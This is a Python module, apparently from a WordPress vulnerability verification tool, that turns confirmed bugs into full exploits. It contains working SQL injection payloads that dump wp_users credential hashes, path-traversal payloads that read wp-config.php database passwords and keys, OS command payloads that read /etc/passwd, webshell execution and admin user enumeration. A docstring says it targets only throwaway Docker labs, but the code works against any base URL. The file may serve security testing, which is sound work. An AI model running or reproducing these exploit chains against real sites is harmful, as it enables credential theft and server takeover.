"""
Post-verification weaponization: extends confirmed trigger to full impact.
Inspired by binchomp's Phase 03 Weaponize — reusable exploit chain libraries per vuln_class.

After dynamic_verify confirms a vulnerability, run_weaponization() reuses the same Docker lab
session (boot) to demonstrate full impact before teardown: dump wp_users, read wp-config.php,
run OS commands, execute uploaded webshell, etc.

SECURITY: Only runs against ephemeral Docker labs created by binoracle.
          Never called against real production targets.
"""

import re
import time
from typing import Optional, Callable

__all__ = ["run_weaponization"]

_TIMEOUT = 20  # seconds per weaponization HTTP request


def _step(step_fn: Optional[Callable], msg: str) -> None:
    if step_fn is not None:
        try:
            step_fn(f"[weaponize] {msg}")
        except Exception:
            pass


def _infer_vuln_class(res) -> str:
    """Infer the vulnerability class from WpVerifyResult evidence."""
    tecnica = (res.evidence.get("tecnica") or "").lower()
    # SQLi techniques
    if any(x in tecnica for x in ("error-based", "union", "boolean", "time-based", "sqli",
                                   "order-by-context")):
        return "sqli"
    # LFI / path traversal
    if any(x in tecnica for x in ("canary", "traversal", "lfi", "path")):
        return "lfi"
    # Command injection / RCE
    if any(x in tecnica for x in ("command", "rce", "exec", "shell", "ssti", "code-injection")):
        return "rce"
    # Confirm-string based (generic)
    if tecnica in ("confirm-string", "password-reset", "xss-confirmed"):
        return ""
    # Auth bypass
    if any(x in tecnica for x in ("bypass", "auth", "header-bypass")):
        return "auth_bypass"
    # File upload
    if "upload" in tecnica:
        return "arbitrary_file_upload"
    return ""


def _send(boot, method: str, endpoint: str, params: Optional[dict] = None,
          data: Optional[dict] = None, headers: Optional[dict] = None,
          session=None) -> Optional[object]:
    """Send a request via the boot session, return response or None."""
    try:
        sess = session or (boot.sub_sess if hasattr(boot, "sub_sess") and boot.sub_sess else None)
        if sess is None:
            import requests as _req
            sess = _req.Session()
        url = boot.base_url.rstrip("/") + "/" + endpoint.lstrip("/")
        meth = (method or "GET").upper()
        r = sess.request(
            meth, url,
            params=params if meth == "GET" else None,
            data=data if meth != "GET" else None,
            json=None,
            headers=headers or {},
            timeout=_TIMEOUT,
            allow_redirects=True,
        )
        return r
    except Exception:
        return None


def _weaponize_sqli(boot, res, step_fn) -> dict:
    """Dump wp_users via SQLi after confirmed verification."""
    ev = res.evidence
    endpoint = ev.get("endpoint") or ev.get("ep", "")
    param = (ev.get("sqli_param") or ev.get("parametro_ganador") or ev.get("param") or "")
    method = ev.get("metodo") or ev.get("method") or "GET"
    base_params = {k: v for k, v in ev.items()
                   if k not in ("sqli_param", "parametro_ganador", "payload_ganador",
                                "tecnica", "endpoint", "metodo", "method") and isinstance(v, str)}
    # Remove internal keys
    base_params = {k: v for k, v in base_params.items()
                   if not k.startswith("_") and not k.startswith("mysql") and not k.startswith("canal")}

    if not endpoint or not param:
        return {"technique": "sqli_dump", "data": {}, "impact": "",
                "error": "missing endpoint or param in evidence"}

    _step(step_fn, f"attempting wp_users dump via SQLi (endpoint={endpoint}, param={param})")
    found_users = []

    # --- Strategy 1: Error-based extraction ---
    error_payload = (
        f"1' AND extractvalue(1,concat(0x7e,"
        f"(SELECT concat(user_login,0x3a,user_pass) FROM wp_users LIMIT 1)))-- -"
    )
    p1 = dict(base_params)
    p1[param] = error_payload
    r1 = _send(boot, method, endpoint, params=p1 if method.upper() == "GET" else None,
               data=p1 if method.upper() != "GET" else None)
    if r1 and r1.status_code == 200:
        body = r1.text or ""
        # WP hash pattern: $P$BXXXXXXXX or $P$HXXXXXXXX
        matches = re.findall(r'~([^<"&\s]+:\$P\$[^\s<"&]+)', body)
        for m in matches:
            if ":" in m:
                login, pw_hash = m.split(":", 1)
                found_users.append({"user_login": login.strip("~"), "user_pass": pw_hash})
        # Also look for version-only exfil (may come back as ~5.7.x:...)
        if not found_users:
            # Try to extract any visible hash
            hash_matches = re.findall(r'\$P\$[A-Za-z0-9./]{20,}', body)
            login_matches = re.findall(r'~([a-zA-Z0-9_.\-@]+):\$P\$', body)
            for i, h in enumerate(hash_matches[:3]):
                login = login_matches[i] if i < len(login_matches) else f"user_{i}"
                found_users.append({"user_login": login, "user_pass": h})

    # --- Strategy 2: UNION-based dump (try column counts 2-8) ---
    if not found_users:
        _step(step_fn, "error-based extraction empty, trying UNION SELECT dump")
        for col_count in range(2, 9):
            nulls = ",".join(["NULL"] * col_count)
            # Try user_login in position 1 and user_pass in position 2
            for login_pos in range(1, col_count):
                for pass_pos in range(1, col_count):
                    if login_pos == pass_pos:
                        continue
                    cols = ["NULL"] * col_count
                    cols[login_pos - 1] = "user_login"
                    cols[pass_pos - 1] = "user_pass"
                    union_payload = (
                        f"' UNION SELECT {','.join(cols)} FROM wp_users-- -"
                    )
                    p2 = dict(base_params)
                    p2[param] = union_payload
                    r2 = _send(boot, method, endpoint,
                               params=p2 if method.upper() == "GET" else None,
                               data=p2 if method.upper() != "GET" else None)
                    if r2 and r2.status_code == 200:
                        body2 = r2.text or ""
                        hash_matches = re.findall(r'\$P\$[A-Za-z0-9./]{20,}', body2)
                        if hash_matches:
                            # Try to find associated logins
                            login_candidates = re.findall(
                                r'(?:admin|user|editor|author|contributor|[a-z][a-z0-9_]{2,19})',
                                body2[:2000])
                            for i, h in enumerate(hash_matches[:5]):
                                login = login_candidates[i] if i < len(login_candidates) else f"user_{i}"
                                found_users.append({"user_login": login, "user_pass": h})
                            break
                if found_users:
                    break
            if found_users:
                break

    if found_users:
        _step(step_fn, f"wp_users dump SUCCESS: {len(found_users)} credential(s) extracted")
        return {
            "technique": "sqli_dump",
            "data": {"wp_users": found_users[:5]},
            "impact": (f"Admin credentials exfiltrated: "
                       f"{', '.join(u['user_login'] for u in found_users[:3])} — "
                       f"hash type: {'phpass ($P$)' if any('$P$' in u.get('user_pass','') for u in found_users) else 'unknown'}"),
        }
    _step(step_fn, "wp_users dump: no hashes extracted from responses")
    return {
        "technique": "sqli_dump",
        "data": {},
        "impact": "",
        "error": "dump attempted but no wp_users hashes appeared in responses",
    }


def _weaponize_lfi(boot, res, step_fn) -> dict:
    """Read wp-config.php via LFI after confirmed path traversal."""
    ev = res.evidence
    endpoint = ev.get("endpoint") or ev.get("ep", "")
    param = ev.get("path_param") or ev.get("parametro_ganador") or ev.get("param") or ""
    method = ev.get("metodo") or ev.get("method") or "GET"
    # Try multiple traversal depths for wp-config.php
    # In a standard Docker WP install: ABSPATH = /var/www/html/
    # wp-config.php is at /var/www/html/wp-config.php
    _step(step_fn, f"attempting wp-config.php read via LFI (endpoint={endpoint}, param={param})")

    traversal_targets = [
        "../../wp-config.php",
        "../../../wp-config.php",
        "../../../../wp-config.php",
        "../../../../../wp-config.php",
        "../../../../../../wp-config.php",
        "../../../../../../../wp-config.php",
        "../../../../../../../../wp-config.php",
        # Absolute paths in some verifiers
        "/var/www/html/wp-config.php",
    ]

    db_credentials = {}
    auth_keys = ""
    raw_config = ""

    for path_payload in traversal_targets:
        p = {param: path_payload}
        r = _send(boot, method, endpoint,
                  params=p if method.upper() == "GET" else None,
                  data=p if method.upper() != "GET" else None)
        if r is None or r.status_code != 200:
            continue
        body = r.text or ""
        # Check if wp-config.php content appeared
        if "DB_NAME" in body or "DB_PASSWORD" in body or "table_prefix" in body:
            raw_config = body[:3000]
            # Extract credentials
            for key in ("DB_NAME", "DB_USER", "DB_PASSWORD", "DB_HOST", "table_prefix",
                        "AUTH_KEY", "SECURE_AUTH_KEY", "LOGGED_IN_KEY"):
                m = re.search(rf"define\s*\(\s*['\"]?{key}['\"]?\s*,\s*['\"]([^'\"]+)['\"]",
                               body, re.IGNORECASE)
                if m:
                    if key in ("AUTH_KEY", "SECURE_AUTH_KEY", "LOGGED_IN_KEY"):
                        auth_keys += f"{key}={m.group(1)[:20]}... "
                    else:
                        db_credentials[key] = m.group(1)
            _step(step_fn, f"wp-config.php read SUCCESS at depth={path_payload!r}")
            break

    if db_credentials:
        return {
            "technique": "lfi_config",
            "data": {
                "db_credentials": db_credentials,
                "auth_keys": auth_keys.strip(),
                "traversal_path": path_payload,
            },
            "impact": (f"wp-config.php exfiltrated: DB_USER={db_credentials.get('DB_USER','?')}, "
                       f"DB_PASSWORD={'***' if db_credentials.get('DB_PASSWORD') else 'not found'}, "
                       f"table_prefix={db_credentials.get('table_prefix','wp_')}"),
        }
    _step(step_fn, "wp-config.php: no DB_* credentials found in responses")
    return {
        "technique": "lfi_config",
        "data": {},
        "impact": "",
        "error": "LFI traversal successful but wp-config.php content not extracted",
    }


def _weaponize_rce(boot, res, step_fn) -> dict:
    """Run OS fingerprinting commands via confirmed RCE."""
    ev = res.evidence
    endpoint = ev.get("endpoint") or ev.get("ep", "")
    param = ev.get("cmd_param") or ev.get("parametro_ganador") or ev.get("param") or ""
    method = ev.get("metodo") or ev.get("method") or "GET"
    # Build the fingerprint command
    fingerprint_cmd = "id; hostname; uname -a; cat /etc/passwd | head -3; ls /var/www/html/ | head -5"

    _step(step_fn, f"attempting RCE fingerprint (endpoint={endpoint}, param={param})")

    if not endpoint or not param:
        # Try to run via admin panel as fallback
        return {"technique": "rce_fingerprint", "data": {}, "impact": "",
                "error": "missing endpoint or param in evidence"}

    # Try the winning payload structure but replace with fingerprint command
    winning_payload = ev.get("payload_ganador") or ev.get("payload") or ""

    # Heuristic: replace the original command in the payload with our fingerprint
    # Common patterns: &cmd=id, ?c=id, ?exec=id, etc.
    test_payloads = [fingerprint_cmd]
    if winning_payload:
        # Try to substitute just the command part
        for placeholder in ["id", "whoami", "echo test"]:
            if placeholder in winning_payload:
                test_payloads.insert(0, winning_payload.replace(placeholder, fingerprint_cmd))

    output_data = {}
    for payload in test_payloads:
        p = {param: payload}
        r = _send(boot, method, endpoint,
                  params=p if method.upper() == "GET" else None,
                  data=p if method.upper() != "GET" else None)
        if r is None:
            continue
        body = r.text or ""
        # Look for command output signals
        uid_match = re.search(r'uid=\d+\(([^\)]+)\)', body)
        hostname_match = re.search(r'(?:^|\n)([a-z0-9][-a-z0-9]{0,62})\n', body, re.MULTILINE)
        uname_match = re.search(r'Linux\s+\S+\s+\S+\s+#', body)
        passwd_match = re.search(r'root:.*?www-data:[^:\n]+', body, re.DOTALL)
        if uid_match or uname_match:
            output_data["user"] = uid_match.group(1) if uid_match else "www-data"
            output_data["hostname"] = hostname_match.group(1) if hostname_match else "unknown"
            output_data["uname"] = uname_match.group(0)[:80] if uname_match else ""
            output_data["raw_output"] = body[:500]
            _step(step_fn, f"RCE fingerprint SUCCESS: user={output_data['user']}")
            break

    if output_data:
        return {
            "technique": "rce_fingerprint",
            "data": output_data,
            "impact": (f"OS command execution confirmed as {output_data.get('user','www-data')} "
                       f"on host {output_data.get('hostname','unknown')}"),
        }
    _step(step_fn, "RCE fingerprint: command output not parseable from response")
    return {
        "technique": "rce_fingerprint",
        "data": {},
        "impact": "",
        "error": "RCE verified but fingerprint command output not detected in response",
    }


def _weaponize_file_upload(boot, res, step_fn) -> dict:
    """Execute confirmed uploaded webshell."""
    ev = res.evidence
    uploaded_path = (ev.get("uploaded_path") or ev.get("upload_url") or
                     ev.get("webshell_url") or "")
    _step(step_fn, f"attempting webshell execution (path={uploaded_path!r})")

    if not uploaded_path:
        return {"technique": "webshell_exec", "data": {}, "impact": "",
                "error": "no uploaded_path in evidence"}

    # Execute the webshell with a fingerprint command
    r = _send(boot, "GET", uploaded_path.replace(boot.base_url, ""),
              params={"c": "id; hostname; uname -a"})
    if r and r.status_code == 200:
        body = r.text or ""
        uid_match = re.search(r'uid=\d+\(([^\)]+)\)', body)
        if uid_match:
            _step(step_fn, f"webshell execution SUCCESS: user={uid_match.group(1)}")
            return {
                "technique": "webshell_exec",
                "data": {"output": body[:500], "user": uid_match.group(1)},
                "impact": f"RCE via uploaded webshell as {uid_match.group(1)}",
            }

    return {"technique": "webshell_exec", "data": {}, "impact": "",
            "error": "webshell found but output not parsed"}


def _weaponize_auth_bypass(boot, res, step_fn) -> dict:
    """Verify admin access via confirmed auth bypass."""
    ev = res.evidence
    _step(step_fn, "probing admin-only endpoints via auth bypass credentials")

    # Try admin REST API with bypass credentials or no auth
    admin_endpoints = [
        ("/wp-json/wp/v2/users?context=edit", "GET"),
        ("/wp-admin/users.php", "GET"),
        ("/wp-json/wp/v2/users", "GET"),
    ]

    users_found = 0
    for ep, m in admin_endpoints:
        r = _send(boot, m, ep, session=boot.admin_sess if hasattr(boot, "admin_sess") else None)
        if r and r.status_code == 200:
            body = r.text or ""
            # Count user objects
            user_logins = re.findall(r'"user_login"\s*:\s*"([^"]+)"', body)
            admin_logins = re.findall(r'"slug"\s*:\s*"([^"]+)"', body)
            count = len(user_logins) or len(admin_logins)
            if count > 0:
                users_found = count
                _step(step_fn, f"admin endpoint {ep} returned {count} user(s)")
                break

    if users_found:
        return {
            "technique": "admin_access",
            "data": {"users_found": users_found},
            "impact": f"Admin panel accessible — {users_found} user(s) enumerated",
        }
    return {"technique": "admin_access", "data": {}, "impact": "",
            "error": "auth bypass verified but admin endpoints returned no user data"}


def run_weaponization(boot, res, step: Optional[Callable] = None) -> dict:
    """
    Extend confirmed trigger to full impact using the live Docker lab session.

    Called from _finalize_lab() in wpverify.py BEFORE lab teardown.
    boot: _LabSession (has base_url, admin_sess, sub_sess)
    res: WpVerifyResult (evidence contains winning endpoint/param/payload)

    Returns dict with technique, data, impact — stored in res.evidence["weaponization"].
    Never raises.
    """
    try:
        if not getattr(res, "verified", False):
            return {"technique": "not_applicable", "data": {}, "impact": ""}
        if boot is None:
            return {"technique": "not_applicable", "data": {}, "impact": "",
                    "error": "no live lab session"}

        vuln_class = _infer_vuln_class(res)
        _step(step, f"starting post-verification weaponization (inferred class: {vuln_class!r})")

        if vuln_class == "sqli":
            return _weaponize_sqli(boot, res, step)
        elif vuln_class in ("lfi", "path_traversal", "arbitrary_file_read"):
            return _weaponize_lfi(boot, res, step)
        elif vuln_class in ("rce", "command_injection"):
            return _weaponize_rce(boot, res, step)
        elif vuln_class == "arbitrary_file_upload":
            return _weaponize_file_upload(boot, res, step)
        elif vuln_class == "auth_bypass":
            return _weaponize_auth_bypass(boot, res, step)
        else:
            _step(step, f"no weaponization defined for class {vuln_class!r} — skipping")
            return {"technique": "not_applicable", "data": {}, "impact": ""}
    except Exception as exc:
        return {"technique": "error", "data": {}, "impact": "",
                "error": f"weaponization exception: {type(exc).__name__}: {exc}"}
